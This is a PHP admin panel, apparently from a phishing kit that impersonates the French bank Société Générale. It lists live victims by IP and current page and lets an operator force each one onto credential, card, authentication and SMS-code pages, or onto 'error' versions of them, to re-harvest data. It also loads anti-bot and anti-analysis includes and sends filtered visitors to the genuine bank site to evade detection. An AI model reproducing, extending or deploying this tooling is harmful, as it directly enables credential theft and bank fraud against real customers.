<?php
error_reporting(0);
set_time_limit(0);
session_start();
include ('../prevents/bots.php');
include ('../prevents/antimar.php');
include ('../prevents/banned-ip.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}
$usersFile = 'active_users.json';
$redirectsFile = 'redirects.json';

$users = file_exists($usersFile) ? json_decode(file_get_contents($usersFile), true) : [];
$redirects = file_exists($redirectsFile) ? json_decode(file_get_contents($redirectsFile), true) : [];

// 🔁 Supprimer les utilisateurs inactifs depuis plus de 6 minutes
$now = time();
$timeout = 360; // 6 minutes

foreach ($users as $ip => $info) {
    if (!isset($info['last_seen']) || ($now - $info['last_seen']) > $timeout) {
        unset($users[$ip]);
    }
}

file_put_contents($usersFile, json_encode($users, JSON_PRETTY_PRINT));

// 🎯 Gérer les redirections si formulaire POST envoyé
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = $_POST['ip'];
    $url = $_POST['url'];

    $redirects[$ip] = $url;
    file_put_contents($redirectsFile, json_encode($redirects, JSON_PRETTY_PRINT));
    header("Location: panel.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Panel Admin</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #f9f9f9;
            padding: 30px;
        }

        h1 {
            color: #333;
            text-align: center;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            background: white;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }

        th, td {
            padding: 15px;
            border-bottom: 1px solid #ddd;
            text-align: left;
        }

        th {
            background-color: #4CAF50;
            color: white;
        }

        tr:hover {
            background-color: #f1f1f1;
        }

        .btn {
            border: none;
            padding: 7px 12px;
            cursor: pointer;
            border-radius: 4px;
            font-size: 13px;
            margin: 2px;
        }

        .redirect-btn {
            background-color: #3498db;
            color: white;
        }

        .error-btn {
            background-color: #e74c3c;
            color: white;
        }

        .btn-group {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
        }

        td form {
            display: inline;
        }

        .small {
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>

<h1>🎯 Panel de Redirection des Utilisateurs</h1>

<table>
    <thead>
        <tr>
            <th>IP</th>
            <th>VID</th>
            <th>Page Actuelle</th>
            <th>Dernière Activité</th>
            <th>Actions</th>
        </tr>
    </thead>
    <tbody>
        <?php foreach ($users as $ip => $info): ?>
            <tr>
                <td><?= htmlspecialchars($ip) ?></td>
                <td><?= htmlspecialchars($info['vid'] ?? '-') ?></td>
                <td><?= htmlspecialchars($info['last_page'] ?? '-') ?></td>
                <td><?= isset($info['last_seen']) ? date('H:i:s', $info['last_seen']) : '-' ?></td>
                <td>
                    <div class="btn-group">
                        <!-- Redirections normales -->
                        <?php foreach (['connexion.php', 'info.php', 'carte.php', 'authentification.php', 'succes.php', 'banni.php', 'sms.php'] as $page): ?>
                            <form method="post">
                                <input type="hidden" name="ip" value="<?= htmlspecialchars($ip) ?>">
                                <input type="hidden" name="url" value="<?= $page ?>">
                                <button class="btn redirect-btn"><?= $page ?></button>
                            </form>
                        <?php endforeach; ?>

                        <!-- Boutons Infos incorrectes -->
                        <?php foreach (['connexion.php', 'info.php', 'carte.php', 'authentification.php', 'sms.php'] as $page): ?>
                            <form method="post">
                                <input type="hidden" name="ip" value="<?= htmlspecialchars($ip) ?>">
                                <input type="hidden" name="url" value="<?= $page ?>?error=1">
                                <button class="btn error-btn"><?= $page ?> ❌</button>
                            </form>
                        <?php endforeach; ?>
                    </div>
                </td>
            </tr>
        <?php endforeach; ?>
    </tbody>
</table>

</body>
</html>
